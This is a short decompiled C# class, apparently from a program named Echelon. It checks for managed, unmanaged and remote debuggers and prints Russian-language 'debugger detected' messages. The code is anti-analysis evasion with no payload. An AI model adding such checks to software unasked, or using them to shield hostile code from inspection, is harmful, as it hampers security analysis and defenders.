using System;
using System.Diagnostics;

namespace Echelon.Global.Protect
{
	// Token: 0x02000049 RID: 73
	internal class DebugProtect1
	{
		// Token: 0x060001B7 RID: 439 RVA: 0x0000CDDC File Offset: 0x0000AFDC
		public static int PerformChecks()
		{
			if (DebugProtect1.CheckDebuggerManagedPresent() == 1)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Обнаружен регулируемый дебаггер: HIT");
				return 1;
			}
			if (DebugProtect1.CheckDebuggerUnmanagedPresent() == 1)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Обнаружен нерегулируемый дебаггер: HIT");
				return 1;
			}
			if (DebugProtect1.CheckRemoteDebugger() == 1)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Обнаружен удаленный дебаггер: HIT");
				return 1;
			}
			return 0;
		}

		// Token: 0x060001B8 RID: 440 RVA: 0x0000CE48 File Offset: 0x0000B048
		private static int CheckDebuggerManagedPresent()
		{
			if (Debugger.IsAttached)
			{
				return 1;
			}
			return 0;
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x0000CE58 File Offset: 0x0000B058
		private static int CheckDebuggerUnmanagedPresent()
		{
			if (NativeMethods.IsDebuggerPresent())
			{
				return 1;
			}
			return 0;
		}

		// Token: 0x060001BA RID: 442 RVA: 0x0000CE68 File Offset: 0x0000B068
		private static int CheckRemoteDebugger()
		{
			bool flag = false;
			if (NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag) && flag)
			{
				return 1;
			}
			return 0;
		}
	}
}
